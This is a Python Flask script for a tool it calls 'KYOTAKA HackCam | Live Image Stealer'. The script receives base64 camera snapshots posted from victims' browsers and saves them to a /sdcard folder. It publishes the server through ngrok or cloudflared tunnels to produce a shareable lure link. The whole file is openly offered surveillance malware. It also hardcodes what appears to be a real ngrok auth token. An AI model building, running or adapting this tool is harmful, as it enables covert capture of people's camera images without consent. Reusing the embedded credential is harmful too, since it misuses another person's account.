from flask import Flask, render_template, request
import os
import base64
import subprocess
import time
import re
import platform
import shutil

app = Flask(__name__)

NGROK_TOKEN = "30ygUgcUCzRLc2KwW9aLpRyqq0s_3ipxEH2H1Vhz4RfgjtqSv"

def kyotaka_banner():
    os.system('clear')
    print("\033[1;31m")
    print("═══════════════════════════════════════════════")
    print("█▀▀ █▄█ █▀▄ █▀▀ █▀▀ █▀▀ ▄▀█ █░░ █░░ █▄▀ ▄▀█")
    print("█▄▄ ░█░ █▄▀ ██▄ █▄█ █▄█ █▀█ █▄▄ █▄▄ █░█ █▀█")
    print("═══════════════════════════════════════════════")
    print("⚡ KYOTAKA HackCam | Live Image Stealer")
    print("🗂️ Dossier de capture : /sdcard/KYOTAKA_HackCam")
    print("[1] Cloudflared")
    print("[2] Ngrok\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    number = data['number']
    path = '/sdcard/KYOTAKA_HackCam'
    os.makedirs(path, exist_ok=True)
    with open(f'{path}/capture_{number}.jpg', 'wb') as f:
        f.write(base64.b64decode(image_data))
    return 'OK'

def download_ngrok():
    arch = platform.machine()
    if arch.startswith('arm') or arch.startswith('aarch'):
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
    elif arch == 'x86_64':
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
    else:
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
    if os.path.exists('ngrok'):
        os.remove('ngrok')
    print("Téléchargement de Ngrok...")
    os.system(f'curl -s {url} -o ngrok.zip')
    os.system('unzip -qq ngrok.zip')
    os.system('chmod +x ngrok')
    os.remove('ngrok.zip')

def start_ngrok(port):
    download_ngrok()
    print("Ajout du token Ngrok...")
    os.system(f'./ngrok authtoken {NGROK_TOKEN}')
    print("Lancement de Ngrok...")
    ngrok_process = subprocess.Popen(['./ngrok', 'http', str(port)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    while True:
        line = ngrok_process.stdout.readline().decode()
        if "url=" in line:
            url_match = re.search(r'https://[0-9a-z]+\.ngrok.io', line)
            if url_match:
                print(f"\033[1;32m🔗 Lien public (Ngrok) : {url_match.group(0)}\033[0m\n")
                break
        if line == '' and ngrok_process.poll() is not None:
            break

def start_cloudflared(port):
    try:
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        while True:
            line = process.stdout.readline().decode()
            if "trycloudflare.com" in line:
                url_match = re.search(r'(https://.*\.trycloudflare\.com)', line)
                if url_match:
                    print(f"\033[1;32m🔗 Lien public (Cloudflared) : {url_match.group(1)}\033[0m\n")
                    break
            if line == '' and process.poll() is not None:
                break
    except:
        print("\033[1;31mErreur cloudflared\033[0m")

if __name__ == '__main__':
    kyotaka_banner()
    choix = input("🌐 Choisis ton tunnel (1/2) : ")
    port = 5000
    time.sleep(1)
    if choix == "1":
        start_cloudflared(port)
    elif choix == "2":
        start_ngrok(port)
    else:
        print("Choix invalide, utilisation Cloudflared par défaut.")
        start_cloudflared(port)
    app.run(port=port)